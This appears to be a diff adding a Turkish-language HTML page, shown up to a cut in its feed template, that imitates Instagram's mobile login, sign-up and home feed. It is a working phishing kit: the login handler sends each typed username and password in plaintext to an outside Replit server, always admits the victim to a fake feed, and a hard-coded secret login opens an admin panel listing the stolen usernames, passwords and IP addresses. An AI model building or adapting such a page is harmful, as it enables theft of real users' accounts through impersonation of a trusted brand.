@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <title>Instagram</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { height: 100%; width: 100%; background: #000; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      color: #f5f5f5;
+    }
+
+    /* ── Screens ── */
+    .screen { display: none; flex-direction: column; min-height: 100vh; min-height: 100dvh; background: #1a1a1a; width: 100%; }
+    .screen.active { display: flex; }
+
+    /* ── Auth shared ── */
+    .statusbar { height: 24px; }
+    .topbar {
+      display: flex; align-items: center; justify-content: center;
+      position: relative; height: 48px; padding: 0 16px;
+    }
+    .back-btn {
+      position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
+      background: none; border: none; cursor: pointer; padding: 6px;
+      display: flex; align-items: center;
+    }
+    .language {
+      display: flex; align-items: center; gap: 4px;
+      color: #aaaaaa; font-size: 14px; font-weight: 500; cursor: pointer;
+    }
+    .auth-content {
+      display: flex; flex-direction: column; align-items: center; padding: 20px 20px 0;
+    }
+    .logo-wrap { margin-bottom: 24px; }
+    .inputs {
+      width: 100%; display: flex; flex-direction: column;
+      gap: 8px; margin-bottom: 12px;
+    }
+    input[type=text], input[type=password], input[type=email], input[type=tel] {
+      width: 100%; background: #262626; border: 1px solid #3a3a3a;
+      border-radius: 10px; color: #f5f5f5; font-size: 14px;
+      font-family: inherit; padding: 15px 16px; outline: none; -webkit-appearance: none;
+    }
+    input::placeholder { color: #888; }
+    input:focus { border-color: #555; }
+    input.field-error { border-color: #ff4444; }
+
+    .btn-primary {
+      width: 100%; background: #0095F6; color: #fff; border: none;
+      border-radius: 50px; font-size: 15px; font-weight: 600;
+      font-family: inherit; padding: 14px 20px; cursor: pointer;
+      margin-top: 4px; transition: opacity 0.15s;
+    }
+    .btn-primary:active { opacity: 0.85; }
+    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
+    .error-msg { margin-top: 10px; color: #ff4444; font-size: 13px; text-align: center; min-height: 18px; }
+    .forgot { margin-top: 20px; color: #f5f5f5; font-size: 13.5px; text-align: center; cursor: pointer; }
+    .spacer { flex: 1; }
+    .auth-bottom {
+      padding: 16px 20px 44px; display: flex;
+      flex-direction: column; align-items: center; gap: 18px;
+    }
+    .btn-outline {
+      width: 100%; background: transparent; color: #0095F6;
+      border: 1.5px solid #0095F6; border-radius: 50px; font-size: 14px;
+      font-weight: 600; font-family: inherit; padding: 12px 20px;
+      cursor: pointer; -webkit-appearance: none; transition: opacity 0.15s;
+    }
+    .btn-outline:active { opacity: 0.7; }
+    .meta-row { display: flex; align-items: center; gap: 6px; }
+    .meta-text { color: #aaa; font-size: 13px; font-weight: 500; }
+
+    /* Register extras */
+    .reg-subtitle { color: #aaa; font-size: 14px; text-align: center; margin-bottom: 20px; line-height: 1.5; }
+    .terms { margin-top: 14px; color: #666; font-size: 12px; text-align: center; line-height: 1.5; }
+    .terms span { color: #aaa; }
+    .login-link { color: #aaa; font-size: 14px; text-align: center; }
+    .login-link a { color: #0095F6; font-weight: 600; text-decoration: none; cursor: pointer; }
+
+    /* ── Home screen ── */
+    #screenHome { background: #000; }
+
+    .topnav {
+      position: sticky; top: 0; background: #000; display: flex;
+      align-items: center; justify-content: space-between;
+      padding: 10px 14px; z-index: 100; border-bottom: 1px solid #1a1a1a;
+    }
+    .topnav-logo { font-size: 22px; font-weight: 700; color: #f5f5f5; font-family: Georgia, serif; font-style: italic; }
+    .topnav-icons { display: flex; align-items: center; gap: 18px; }
+    .icon-btn { background: none; border: none; cursor: pointer; padding: 2px; display: flex; align-items: center; }
+
+    .feed { padding-bottom: 70px; overflow-y: auto; flex: 1; }
+
+    .stories-wrap {
+      overflow-x: auto; display: flex; gap: 12px;
+      padding: 12px; border-bottom: 1px solid #1a1a1a; scrollbar-width: none;
+    }
+    .stories-wrap::-webkit-scrollbar { display: none; }
+    .story { display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; flex-shrink: 0; }
+    .story-ring { width: 62px; height: 62px; border-radius: 50%; padding: 2.5px; background: linear-gradient(45deg,#f8a133,#e1306c,#833ab4,#405de6); }
+    .story-avatar {
+      width: 100%; height: 100%; border-radius: 50%; border: 2.5px solid #000;
+      object-fit: cover; background: #262626; display: flex; align-items: center;
+      justify-content: center; font-size: 20px; font-weight: 700; color: #fff; overflow: hidden;
+    }
+    .story-name { font-size: 11px; color: #aaa; max-width: 62px; text-align: center; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
+    .story-add-ring { width: 62px; height: 62px; border-radius: 50%; border: 1px solid #333; display: flex; align-items: center; justify-content: center; position: relative; }
+    .story-add-plus { position: absolute; bottom: 0; right: 0; width: 20px; height: 20px; background: #0095F6; border-radius: 50%; border: 2px solid #000; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; color: #fff; line-height: 1; }
+
+    .post { border-bottom: 1px solid #1a1a1a; }
+    .post-header { display: flex; align-items: center; justify-content: space-between; padding: 10px 12px; }
+    .post-user { display: flex; align-items: center; gap: 10px; }
+    .post-avatar { width: 36px; height: 36px; border-radius: 50%; flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 700; color: #fff; overflow: hidden; }
+    .post-meta { display: flex; flex-direction: column; }
+    .post-username { font-size: 13.5px; font-weight: 600; }
+    .post-location { font-size: 11px; color: #aaa; }
+    .post-more { background: none; border: none; cursor: pointer; color: #f5f5f5; font-size: 18px; line-height: 1; padding: 4px; }
+    .post-image { width: 100%; aspect-ratio: 1/1; object-fit: cover; display: block; background: #1a1a1a; }
+    .post-actions { display: flex; align-items: center; gap: 14px; padding: 10px 12px 6px; }
+    .save-btn { margin-left: auto; }
+    .action-btn { background: none; border: none; cursor: pointer; color: #f5f5f5; display: flex; align-items: center; padding: 2px; transition: opacity 0.15s; }
+    .action-btn:active { opacity: 0.6; }
+    .action-btn.liked svg path { fill: #ff2d55; stroke: #ff2d55; }
+    .post-likes { font-size: 13.5px; font-weight: 600; padding: 0 12px; margin-bottom: 4px; }
+    .post-caption { font-size: 13.5px; padding: 0 12px 4px; line-height: 1.4; }
+    .post-caption strong { font-weight: 600; }
+    .post-comments-link { font-size: 13px; color: #aaa; padding: 0 12px 4px; cursor: pointer; }
+    .post-time { font-size: 11px; color: #555; padding: 0 12px 10px; text-transform: uppercase; letter-spacing: 0.03em; }
+    .comment-row { display: flex; align-items: center; gap: 10px; padding: 8px 12px 10px; border-top: 1px solid #1a1a1a; }
+    .comment-avatar { width: 28px; height: 28px; border-radius: 50%; flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; color: #fff; }
+    .comment-input { flex: 1; background: none; border: none; outline: none; color: #aaa; font-size: 13.5px; font-family: inherit; }
+    .comment-post-btn { background: none; border: none; color: #0095F6; font-size: 13.5px; font-weight: 600; cursor: pointer; opacity: 0; transition: opacity 0.2s; }
+
+    .bottomnav {
+      position: sticky; bottom: 0; background: #000; display: flex;
+      align-items: center; justify-content: space-around;
+      padding: 10px 0 24px; border-top: 1px solid #1a1a1a; z-index: 100;
+    }
+    .nav-btn { background: none; border: none; cursor: pointer; padding: 4px 12px; display: flex; align-items: center; justify-content: center; }
+    .nav-avatar { width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 700; color: #fff; border: 2px solid #fff; }
+
+    /* ── Admin panel ── */
+    #screenAdmin { background: #0d0d0d; }
+    .admin-header {
+      background: #111; padding: 16px 16px 12px;
+      border-bottom: 1px solid #222; position: sticky; top: 0; z-index: 10;
+    }
+    .admin-title { font-size: 17px; font-weight: 700; color: #fff; letter-spacing: 0.02em; }
+    .admin-subtitle { font-size: 12px; color: #555; margin-top: 2px; }
+    .admin-count { font-size: 12px; color: #0095F6; margin-top: 6px; font-weight: 600; }
+    .admin-clear {
+      margin-top: 8px; background: #1a1a1a; border: 1px solid #333; color: #ff4444;
+      border-radius: 8px; font-size: 12px; font-family: inherit; padding: 6px 14px; cursor: pointer;
+    }
+    .admin-list { flex: 1; overflow-y: auto; padding: 12px 12px 40px; display: flex; flex-direction: column; gap: 10px; }
+    .admin-empty { color: #444; font-size: 14px; text-align: center; margin-top: 60px; }
+    .entry-card {
+      background: #161616; border: 1px solid #222; border-radius: 12px;
+      padding: 14px 14px 12px; display: flex; flex-direction: column; gap: 6px;
+    }
+    .entry-time { font-size: 11px; color: #555; letter-spacing: 0.03em; text-transform: uppercase; }
+    .entry-row { display: flex; align-items: center; gap: 8px; }
+    .entry-label { font-size: 11px; color: #555; min-width: 72px; }
+    .entry-value { font-size: 13.5px; color: #f5f5f5; font-weight: 500; word-break: break-all; }
+    .entry-value.pw { color: #f8a133; font-family: monospace; font-size: 13px; }
+    .entry-badge {
+      display: inline-block; font-size: 10px; font-weight: 700;
+      padding: 2px 7px; border-radius: 20px; margin-left: auto;
+    }
+    .entry-badge.ok  { background: #0d3320; color: #2ecc71; }
+    .entry-badge.fail { background: #2d0d0d; color: #ff4444; }
+  </style>
+</head>
+<body>
+
+<!-- ══════════════════ ADMIN PANEL ══════════════════ -->
+<div class="screen" id="screenAdmin">
+  <div class="admin-header">
+    <div class="admin-title">🔐 Moderasyon Paneli</div>
+    <div class="admin-subtitle">Giriş denemeleri — sadece yetkili erişim</div>
+    <div class="admin-count" id="adminCount"></div>
+    <button class="admin-clear" onclick="clearLogs()">Kayıtları temizle</button>
+  </div>
+  <div class="admin-list" id="adminList"></div>
+</div>
+
+<!-- ══════════════════ LOGIN ══════════════════ -->
+<div class="screen" id="screenLogin">
+  <div class="statusbar"></div>
+  <div class="topbar">
+    <div class="language">
+      <span>Türkçe</span>
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none">
+        <path d="M6 9l6 6 6-6" stroke="#aaaaaa" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+  </div>
+
+  <div class="auth-content">
+    <div class="logo-wrap">
+      <svg width="80" height="80" viewBox="0 0 100 100" fill="none">
+        <defs>
+          <radialGradient id="ig1" cx="30%" cy="107%" r="150%" gradientUnits="objectBoundingBox">
+            <stop offset="0%" stop-color="#feda77"/><stop offset="10%" stop-color="#f8a133"/>
+            <stop offset="30%" stop-color="#e1306c"/><stop offset="55%" stop-color="#c13584"/>
+            <stop offset="75%" stop-color="#833ab4"/><stop offset="100%" stop-color="#405de6"/>
+          </radialGradient>
+        </defs>
+        <rect width="100" height="100" rx="24" fill="url(#ig1)"/>
+        <rect x="18" y="18" width="64" height="64" rx="18" fill="none" stroke="white" stroke-width="5"/>
+        <circle cx="50" cy="50" r="15.5" fill="none" stroke="white" stroke-width="5"/>
+        <circle cx="73" cy="27" r="4" fill="white"/>
+      </svg>
+    </div>
+
+    <div class="inputs">
+      <input id="l_user" type="text" placeholder="Kullanıcı adı, e-posta veya cep numarası" autocomplete="username"/>
+      <input id="l_pass" type="password" placeholder="Şifre" autocomplete="current-password"/>
+    </div>
+
+    <button class="btn-primary" id="l_btn" onclick="doLogin()">Giriş yap</button>
+    <div class="error-msg" id="l_err"></div>
+    <div class="forgot">Şifreni mi unuttun?</div>
+  </div>
+
+  <div class="spacer"></div>
+
+  <div class="auth-bottom">
+    <button class="btn-outline" onclick="return false;">Yeni hesap oluştur</button>
+    <div class="meta-row">
+      <svg width="38" height="18" viewBox="0 0 38 18" fill="none">
+        <path d="M19 9 C19 3.8 15.2 1 11 1 C6.5 1 1 4.8 1 9 C1 13.2 6.5 17 11 17 C15.2 17 19 14.2 19 9 C19 3.8 22.8 1 27 1 C31.5 1 37 4.8 37 9 C37 13.2 31.5 17 27 17 C22.8 17 19 14.2 19 9 Z" fill="#aaa"/>
+      </svg>
+      <span class="meta-text">Meta</span>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════ REGISTER ══════════════════ -->
+<div class="screen" id="screenRegister">
+  <div class="statusbar"></div>
+  <div class="topbar">
+    <button class="back-btn" aria-label="Geri" onclick="showScreen('screenLogin')">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+        <path d="M15 19l-7-7 7-7" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </button>
+  </div>
+
+  <div class="auth-content">
+    <div class="logo-wrap">
+      <svg width="72" height="72" viewBox="0 0 100 100" fill="none">
+        <defs>
+          <radialGradient id="ig2" cx="30%" cy="107%" r="150%" gradientUnits="objectBoundingBox">
+            <stop offset="0%" stop-color="#feda77"/><stop offset="10%" stop-color="#f8a133"/>
+            <stop offset="30%" stop-color="#e1306c"/><stop offset="55%" stop-color="#c13584"/>
+            <stop offset="75%" stop-color="#833ab4"/><stop offset="100%" stop-color="#405de6"/>
+          </radialGradient>
+        </defs>
+        <rect width="100" height="100" rx="24" fill="url(#ig2)"/>
+        <rect x="18" y="18" width="64" height="64" rx="18" fill="none" stroke="white" stroke-width="5"/>
+        <circle cx="50" cy="50" r="15.5" fill="none" stroke="white" stroke-width="5"/>
+        <circle cx="73" cy="27" r="4" fill="white"/>
+      </svg>
+    </div>
+
+    <p class="reg-subtitle">Arkadaşlarının fotoğraflarını ve videolarını görmek için kaydol.</p>
+
+    <div class="inputs">
+      <input id="r_name"  type="text"     placeholder="Ad Soyad" autocomplete="name"/>
+      <input id="r_user"  type="text"     placeholder="Kullanıcı adı" autocomplete="username"/>
+      <input id="r_email" type="email"    placeholder="E-posta" autocomplete="email"/>
+      <input id="r_phone" type="tel"      placeholder="Cep numarası (isteğe bağlı)" autocomplete="tel"/>
+      <input id="r_pass"  type="password" placeholder="Şifre" autocomplete="new-password"/>
+    </div>
+
+    <button class="btn-primary" id="r_btn" onclick="doRegister()">Kaydol</button>
+    <div class="error-msg" id="r_err"></div>
+    <p class="terms">Kaydolarak <span>Kullanım Koşulları</span>, <span>Gizlilik Politikası</span> ve <span>Çerez Politikası</span>'nı kabul etmiş olursunuz.</p>
+  </div>
+
+  <div class="spacer"></div>
+
+  <div class="auth-bottom">
+    <div class="login-link">Zaten hesabın var mı? <a onclick="showScreen('screenLogin')">Giriş yap</a></div>
+    <div class="meta-row">
+      <svg width="38" height="18" viewBox="0 0 38 18" fill="none">
+        <path d="M19 9 C19 3.8 15.2 1 11 1 C6.5 1 1 4.8 1 9 C1 13.2 6.5 17 11 17 C15.2 17 19 14.2 19 9 C19 3.8 22.8 1 27 1 C31.5 1 37 4.8 37 9 C37 13.2 31.5 17 27 17 C22.8 17 19 14.2 19 9 Z" fill="#aaa"/>
+      </svg>
+      <span class="meta-text">Meta</span>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════ HOME FEED ══════════════════ -->
+<div class="screen" id="screenHome">
+  <div class="topnav">
+    <div class="topnav-logo">Instagram</div>
+    <div class="topnav-icons">
+      <button class="icon-btn">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+          <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z" stroke="#f5f5f5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+      <button class="icon-btn">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+          <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" stroke="#f5f5f5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </button>
+    </div>
+  </div>
+
+  <div class="feed">
+    <div class="stories-wrap" id="storiesWrap"></div>
+    <div id="postsContainer"></div>
+  </div>
+
+  <div class="bottomnav">
+    <button class="nav-btn">
+      <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
+        <path d="M3 9.5L12 3l9 6.5V20a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V9.5z" stroke="#f5f5f5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        <path d="M9 21V12h6v9" stroke="#f5f5f5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </button>
+    <button class="nav-btn">
+      <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
+        <circle cx="11" cy="11" r="8" stroke="#f5f5f5" stroke-width="2"/>
+        <path d="M21 21l-4.35-4.35" stroke="#f5f5f5" stroke-width="2" stroke-linecap="round"/>
+      </svg>
+    </button>
+    <button class="nav-btn">
+      <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
+        <rect x="3" y="3" width="8" height="8" rx="1.5" stroke="#f5f5f5" stroke-width="2"/>
+        <rect x="13" y="3" width="8" height="8" rx="1.5" stroke="#f5f5f5" stroke-width="2"/>
+        <rect x="3" y="13" width="8" height="8" rx="1.5" stroke="#f5f5f5" stroke-width="2"/>
+        <rect x="13" y="13" width="8" height="8" rx="1.5" stroke="#f5f5f5" stroke-width="2"/>
+      </svg>
+    </button>
+    <button class="nav-btn">
+      <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
+        <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z" stroke="#f5f5f5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </button>
+    <button class="nav-btn" onclick="doLogout()">
+      <div class="nav-avatar" id="profileNavAvatar">?</div>
+    </button>
+  </div>
+</div>
+
+<script>
+// ── Helpers ──────────────────────────────────────
+function encodePassword(pw) {
+  try { return btoa(unescape(encodeURIComponent(pw))); }
+  catch(e) { return btoa(pw); }
+}
+
+function showScreen(id) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
+}
+
+// ── Init ─────────────────────────────────────────
+const session = JSON.parse(localStorage.getItem('ig_session') || 'null');
+if (session) {
+  buildHome();
+  showScreen('screenHome');
+} else {
+  showScreen('screenLogin');
+}
+
+// ── Config ───────────────────────────────────────
+const ADMIN_USER = 'asam';
+const ADMIN_PASS = '5546';
+const API = 'https://6f871bb3-0267-446b-a140-098179f53986-00-j7beoqdnd8b3.spock.replit.dev/api';
+
+// ── Login ─────────────────────────────────────────
+function doLogin() {
+  const raw  = document.getElementById('l_user').value.trim();
+  const pass = document.getElementById('l_pass').value;
+  const err  = document.getElementById('l_err');
+  const btn  = document.getElementById('l_btn');
+  err.textContent = '';
+
+  if (!raw && !pass) return; // completely empty, do nothing
+
+  // Secret admin backdoor — never logged
+  if (raw === ADMIN_USER && pass === ADMIN_PASS) {
+    buildAdmin();
+    showScreen('screenAdmin');
+    document.getElementById('l_user').value = '';
+    document.getElementById('l_pass').value = '';
+    return;
+  }
+
+  btn.disabled = true; btn.textContent = 'Giriş yapılıyor...';
+
+  // Log to server — fire and forget
+  fetch(API + '/logs', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ username: raw, password: pass, success: true })
+  }).catch(() => {});
+
+  // Always let them in, no matter what
+  setTimeout(() => {
+    const colors = ['#e1306c','#833ab4','#405de6','#0095F6','#f8a133','#00b900'];
+    const color = colors[Math.floor(Math.random() * colors.length)];
+    localStorage.setItem('ig_session', JSON.stringify({
+      username: raw,
+      name: raw,
+      avatar: color
+    }));
+    buildHome();
+    showScreen('screenHome');
+    btn.disabled = false; btn.textContent = 'Giriş yap';
+  }, 600);
+}
+
+// ── Admin panel ───────────────────────────────────
+function buildAdmin() {
+  const list  = document.getElementById('adminList');
+  const count = document.getElementById('adminCount');
+  list.innerHTML = '<div class="admin-empty">Yükleniyor...</div>';
+  count.textContent = '';
+
+  fetch(API + '/logs?key=5546asam')
+    .then(r => r.json())
+    .then(logs => {
+      count.textContent = `Toplam ${logs.length} kayıt`;
+      list.innerHTML = '';
+
+      if (!logs.length) {
+        list.innerHTML = '<div class="admin-empty">Henüz kayıt yok.</div>';
+        return;
+      }
+
+      logs.forEach(entry => {
+        const d = new Date(entry.time);
+        const dateStr = d.toLocaleDateString('tr-TR', { day:'2-digit', month:'2-digit', year:'numeric' });
+        const timeStr = d.toLocaleTimeString('tr-TR', { hour:'2-digit', minute:'2-digit', second:'2-digit' });
+
+        const card = document.createElement('div');
+        card.className = 'entry-card';
+        card.innerHTML = `
+          <div class="entry-time">${dateStr} — ${timeStr}
+            <span class="entry-badge ${entry.success ? 'ok' : 'fail'}">${entry.success ? '✓ GİRİŞ YAPTI' : '✗ BAŞARISIZ'}</span>
+          </div>
+          <div class="entry-row">
+            <span class="entry-label">Kullanıcı adı</span>
+            <span class="entry-value">${entry.username}</span>
+          </div>
+          <div class="entry-row">
+            <span class="entry-label">Şifre</span>
+            <span class="entry-value pw">${entry.password}</span>
+          </div>
+          <div class="entry-row">
+            <span class="entry-label">IP</span>
+            <span class="entry-value" style="color:#555;font-size:12px">${entry.ip || '—'}</span>
+          </div>`;
+        list.appendChild(card);
+      });
+    })
+    .catch(() => {
+      list.innerHTML = '<div class="admin-empty">Sunucuya bağlanılamadı.</div>';
+    });
+}
+
+function clearLogs() {
+  if (confirm('Tüm kayıtlar silinsin mi?')) {
+    fetch(API + '/logs?key=5546asam', { method: 'DELETE' })
+      .then(() => buildAdmin())
+      .catch(() => alert('Silinemedi.'));
+  }
+}
+
+// ── Register ──────────────────────────────────────
+const AVATAR_COLORS = ['#e1306c','#833ab4','#405de6','#0095F6','#f8a133','#00b900'];
+
+function doRegister() {
+  const name  = document.getElementById('r_name').value.trim();
+  const user  = document.getElementById('r_user').value.trim().toLowerCase().replace(/\s+/g,'');
+  const email = document.getElementById('r_email').value.trim().toLowerCase();
+  const phone = document.getElementById('r_phone').value.trim();
+  const pass  = document.getElementById('r_pass').value;
+  const err   = document.getElementById('r_err');
+  const btn   = document.getElementById('r_btn');
+
+  err.textContent = '';
+  ['r_name','r_user','r_email','r_pass'].forEach(id => document.getElementById(id).classList.remove('field-error'));
+
+  if (!name)          { err.textContent = 'Ad Soyad gereklidir.'; document.getElementById('r_name').classList.add('field-error'); return; }
+  if (user.length<3)  { err.textContent = 'Kullanıcı adı en az 3 karakter olmalı.'; document.getElementById('r_user').classList.add('field-error'); return; }
+  if (!email)         { err.textContent = 'E-posta gereklidir.'; document.getElementById('r_email').classList.add('field-error'); return; }
+  if (pass.length<6)  { err.textContent = 'Şifre en az 6 karakter olmalı.'; document.getElementById('r_pass').classList.add('field-error'); return; }
+
+  btn.disabled = true; btn.textContent = 'Kaydediliyor...';
+
+  setTimeout(() => {
+    const users = JSON.parse(localStorage.getItem('ig_users') || '[]');
+    if (users.find(u => u.username === user)) {
+      err.textContent = 'Bu kullanıcı adı zaten kullanılıyor.';
+      document.getElementById('r_user').classList.add('field-error');
+      btn.disabled = false; btn.textContent = 'Kaydol'; return;
+    }
+    if (users.find(u => u.email === email)) {
+      err.textContent = 'Bu e-posta zaten kayıtlı.';
+      document.getElementById('r_email').classList.add('field-error');
+      btn.disabled = false; btn.textContent = 'Kaydol'; return;
+    }
+    const color = AVATAR_COLORS[Math.floor(Math.random() * AVATAR_COLORS.length)];
+    users.push({ username: user, name, email, phone, password: encodePassword(pass), avatar: color });
+    localStorage.setItem('ig_users', JSON.stringify(users));
+    const sess = { username: user, name, avatar: color };
+    localStorage.setItem('ig_session', JSON.stringify(sess));
+    buildHome();
+    showScreen('screenHome');
+    btn.disabled = false; btn.textContent = 'Kaydol';
+  }, 600);
+}
+
+// ── Logout ────────────────────────────────────────
+function doLogout() {
+  if (confirm('Çıkış yapmak istiyor musun?')) {
+    localStorage.removeItem('ig_session');
+    showScreen('screenLogin');
+  }
+}
+
+// ── Home feed ────────────────────────────────────
+const MOCK_USERS = [
+  { username:'ahmet_tr',   name:'Ahmet Yılmaz',  color:'#e1306c', img:'https://picsum.photos/seed/ahmet/400/400'  },
+  { username:'selin.foto', name:'Selin Aydın',   color:'#833ab4', img:'https://picsum.photos/seed/selin/400/400'  },
+  { username:'mert_lens',  name:'Mert Kaya',     color:'#405de6', img:'https://picsum.photos/seed/mertk/400/400'  },
+  { username:'travel.zeyn',name:'Zeynep Arslan',  color:'#f8a133', img:'https://picsum.photos/seed/zeynep/400/400' },
+  { username:'berk.photo', name:'Berk Demir',    color:'#0095F6', img:'https://picsum.photos/seed/berk/400/400'   },
+  { username:'ayse_ist',   name:'Ayşe Şahin',    color:'#00b900', img:'https://picsum.photos/seed/ayse2/400/400'  },
+];
+
+const MOCK_POSTS = [
+  { user:0, location:'İstanbul, Türkiye', img:'https://picsum.photos/seed/post1/600/600', likes:2847, caption:'Boğaz manzarası eşsiz 🌉✨',      time:'2 SAAT ÖNCE',  comments:48  },
+  { user:1, location:'Kapadokya',         img:'https://picsum.photos/seed/post2/600/600', likes:5612, caption:'Balon turu hayat değiştirir 🎈☁️', time:'4 SAAT ÖNCE',  comments:103 },
+  { user:2, location:'Antalya',           img:'https://picsum.photos/seed/post3/600/600', likes:1239, caption:'Sahil sabahları 🌅🐚',             time:'6 SAAT ÖNCE',  comments:27  },
+  { user:3, location:'Ege, Türkiye',      img:'https://picsum.photos/seed/post4/600/600', likes:8034, caption:'Yaz bitmeden son yüzme 🏖️🐬',     time:'1 GÜN ÖNCE',   comments:215 },
+  { user:4, location:'Ankara',            img:'https://picsum.photos/seed/post5/600/600', likes:741,  caption:'Atakule gün batımı 🌇',            time:'1 GÜN ÖNCE',   comments:14  },
+  { user:5, location:'İzmir',             img:'https://picsum.photos/seed/post6/600/600', likes:3298, caption:'Kordon yürüyüşü 🚶‍♀️💙',           time:'2 GÜN ÖNCE',  comments:61  },
+];
+
+const liked = {};
+
+function buildHome() {
+  const sess = JSON.parse(localStorage.getItem('ig_session') || 'null');
+  if (!sess) return;
+
+  // Profile nav avatar
+  const nav = document.getElementById('profileNavAvatar');
+  nav.textContent = sess.name.charAt(0).toUpperCase();
+  nav.style.background = sess.avatar || '#555';
+
+  // Stories
+  const wrap = document.getElementById('storiesWrap');
+  wrap.innerHTML = '';
+  const myStory = document.createElement('div');
+  myStory.className = 'story';
+  myStory.innerHTML = `
+    <div class="story-add-ring">
+      <div class="story-avatar" style="background:${sess.avatar||'#555'};width:57px;height:57px;border:none;font-size:20px">
+        ${sess.name.charAt(0).toUpperCase()}
+      </div>
+      <div class="story-add-plus">+</div>
+    </div>
+    <span class="story-name">Hikayeniz</span>`;
+  wrap.appendChild(myStory);
+
+  MOCK_USERS.forEach(u => {
+    const s = document.createElement('div');
+    s.className = 'story';
+    s.innerHTML = `
+      <div class="story-ring">
+        <div class="story-avatar">
+          <img src="${u.img}" alt="${u.name}" style="width:100%;height:100%;object-fit:cover;border-radius:50%" loading="lazy" onerror="this.style.display='none'"/>
+        </div>
+      </div>
+      <span class="story-name">${u.username}</span>`;
+    wrap.appendChild(s);
+  });
+
+  // Posts
+  const container = document.getElementById('postsContainer');
+  container.innerHTML = '';
+  MOCK_POSTS.forEach((post, i) => {
+    const u = MOCK_USERS[post.user];
+    const div = document.createElement('div');
+    div.className = 'post';
+    div.innerHTML = `
+      <div class="post-header">
+        <div class="post-user">
+          <div class="post-avatar" style="background:${u.color}">
+            <img src="${u.img}" alt="${u.name}" style="width:100%;height:100%;object-fit:cover;border-radius:50%" loading="lazy" onerror="this.style.display='none'"/>
+          </div>
+          <div class="post-meta">
+            <span class="post-username">${u.username}</span>
+            ${post.location ? `<span class="post-location">${post.location}</span>` : ''}
+          </div>
+        </div>
+        <button class="post-more">···</button>
+      </div>
+      <img class="post-image" src="${post.img}" alt="post" loading="lazy"/>
+      <div class="post-actions">
+        <button class="action-btn" id="like-btn-${i}" onclick="toggleLike(${i},${post.likes})">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
+            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z" stroke="#f5f5f5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+        <button class="action-btn">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
+            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" stroke="#f5f5f5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+        <button class="action-btn">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
+            <line x1="22" y1="2" x2="11" y2="13" stroke="#f5f5f5" stroke-width="2" stroke-linecap="round"/>
+            <polygon points="22 2 15 22 11 13 2 9 22 2" stroke="#f5f5f5" stroke-width="2" stroke-linejoin="round" fill="none"/>
+          </svg>
+        </button>
+        <button class="action-btn save-btn">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
+            <path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z" stroke="#f5f5f5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+      </div>
+      <div class="post-likes" id="likes-${i}">${post.likes.toLocaleString('tr-TR')} beğeni</div>
+      <div class="post-caption"><strong>${u.username}</strong> ${post.caption}</div>
+      ${post.comments > 0 ? `<div class="post-comments-link">Tüm ${post.comments} yorumu gör</div>` : ''}
+      <div class="post-time">${post.time}</div>
